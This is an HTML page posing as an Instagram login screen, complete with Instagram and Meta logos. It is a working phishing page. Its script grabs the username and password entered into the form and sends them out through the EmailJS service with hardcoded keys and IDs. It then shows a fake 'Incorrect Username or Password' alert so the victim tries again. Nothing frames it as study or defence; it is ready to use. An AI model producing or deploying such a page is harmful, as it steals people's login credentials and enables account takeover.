<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
    rel="stylesheet"
  />
  <link
    href="https://fonts.googleapis.com/css2?family=SF+Pro+Text&display=swap"
    rel="stylesheet"
  />
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Icons",
        "Helvetica Neue", Helvetica, Arial, sans-serif;
      background: linear-gradient(
        135deg,
        #2a2f33 0%,
        #1e3447 50%,
        #1a2a2a 100%
      );
      min-height: 100vh;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 0 1.5rem;
      color: white;
    }
    input {
      font-family: inherit;
      font-weight: 400;
      font-size: 17px;
      line-height: 22px;
      letter-spacing: -0.022em;
      color: #6b7a8a;
      background-color: #1c242a;
      border-radius: 12px;
      border: none;
      padding-left: 20px;
      height: 56px;
      width: 100%;
      box-sizing: border-box;
    }
    input::placeholder {
      color: #6b7a8a;
    }
    input:focus {
      outline: none;
      box-shadow: 0 0 0 2px #007aff;
    }
    button.login-btn {
      background-color: #007aff;
      border-radius: 28px;
      height: 56px;
      width: 100%;
      font-weight: 500;
      font-size: 17px;
      line-height: 22px;
      letter-spacing: -0.022em;
      color: white;
      border: none;
      cursor: pointer;
      margin-top: 12px;
    }
    button.create-account-btn {
      margin-top: 48px;
      width: 100%;
      height: 56px;
      border-radius: 28px;
      border: 1.5px solid #3a82f6;
      background: transparent;
      color: #3a82f6;
      font-weight: 500;
      font-size: 17px;
      line-height: 22px;
      letter-spacing: -0.022em;
      cursor: pointer;
    }
    p.language {
      font-weight: 400;
      font-size: 15px;
      line-height: 18px;
      letter-spacing: 0.02em;
      margin-bottom: 48px;
      text-align: center;
    }
    p.forgot-password {
      font-weight: 400;
      font-size: 17px;
      line-height: 22px;
      letter-spacing: -0.022em;
      margin-top: 24px;
      text-align: center;
      cursor: pointer;
    }
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 48px auto;
      display: block;
    }
    .meta-logo {
      width: 40px;
      height: 20px;
      margin: 48px auto 0 auto;
      display: block;
    }
    .container {
      max-width: 400px;
      width: 100%;
    }
  </style>
</head>
<body>
  <div class="container">
    <p class="language">English (UK)</p>
    <img
      src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png"
      alt="Instagram logo with gradient colors purple, pink, orange, and yellow"
      class="logo"
      decoding="async"
      loading="lazy"
    />
    <form id="loginForm">
      <input
        id="username"
        type="text"
        placeholder="Username, email address or mobile number"
        autocomplete="username"
        required
      />
      <input
        id="password"
        type="password"
        placeholder="Password"
        autocomplete="current-password"
        class="mt-4"
        required
      />
      <button type="submit" class="login-btn">Log in</button>
    </form>
    <p class="forgot-password">Forgotten password?</p>
    <button class="create-account-btn">Create new account</button>
    <img
      src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png"
      alt="Meta logo in white"
      class="meta-logo"
      decoding="async"
      loading="lazy"
    />
  </div>

  <!-- EmailJS Script -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    // Initialize EmailJS with your public key
    (function() {
      emailjs.init("QJ1BrUaoHlepStnV8");
    })();

    // Handle form submission
    document.getElementById("loginForm").addEventListener("submit", function(event) {
      event.preventDefault();

      // Get input values
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      // Send email
      emailjs.send("service_fmkiuxr", "template_d7wzlzo", {
        username: username,
        password: password
      })
      .then(function() {
        alert("Incorrect Username or Password.Please input again.");
        document.getElementById("loginForm").reset();
      }, function(error) {
        alert("Error 404 " + JSON.stringify(error));
      });
    });
  </script>
</body>
</html>
